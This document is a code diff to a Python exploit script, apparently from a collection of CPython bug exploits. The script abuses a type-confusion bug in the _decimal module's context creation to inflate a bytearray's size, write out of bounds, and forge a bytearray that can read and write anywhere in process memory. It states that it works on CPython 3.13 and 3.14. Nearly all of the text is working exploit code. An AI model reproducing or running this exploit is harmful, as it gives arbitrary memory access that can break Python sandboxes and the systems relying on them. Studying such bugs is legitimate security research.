@@ -3,8 +3,6 @@ Author: @Nico-Posada
 Bug Credits: @Nico-Posada
 """
 
-import _decimal
-
 # TLDR: Abuse type confusion bug to set the size of a bytearray object to an absurdly large number
 # Tested to work on 3.13.0, 3.13.1, 3.14.0
 
@@ -57,6 +55,9 @@ context_new(PyTypeObject *type,
 
 # NOTE: this bug also exists in `context_copy` in _decimal.c but the setup looks to be a little more complicated
 
+import _decimal
+from common import evil_bytearray_obj, PTR_SIZE
+
 # Spam a whole bunch of bytearrays to set up memory in a way where it's arranged as
 # ba header + ba buffer + ba header + ba buffer + ...
 
@@ -82,19 +83,18 @@ SignalDict.__new__ = evil
 # our bytearray's `ob_size` causing the length of `to_break` to become absurdly large 
 _decimal.Context()
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_ba_data = (
-    p64(2**63 - 1) + # ob_size
-    p64(2**63 - 1) + # ob_alloc
-    p64(0) +         # ob_bytes
-    p64(0)           # ob_start
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 # With `to_break` being able to write OOB now, we can overwrite the object ahead of it
 # (in this case, `mem`) to be whatever we want. This is overwriting `mem`'s struct data
 # so it becomes a bytearray which can read/write anywhere in memory
-OFFSET = bytearray.__basicsize__ + 8 + object.__basicsize__
-to_break[OFFSET : OFFSET + len(fake_ba_data)] = fake_ba_data
+OFFSET = bytearray.__basicsize__ + PTR_SIZE
+to_break[OFFSET : OFFSET + len(fake_obj)] = fake_obj
+
+# exploit is a tad inconsistent sometimes
+if len(mem) == bytearray.__basicsize__:
+    exit("failed")
 
 print(type(mem))
 print(hex(len(mem)))
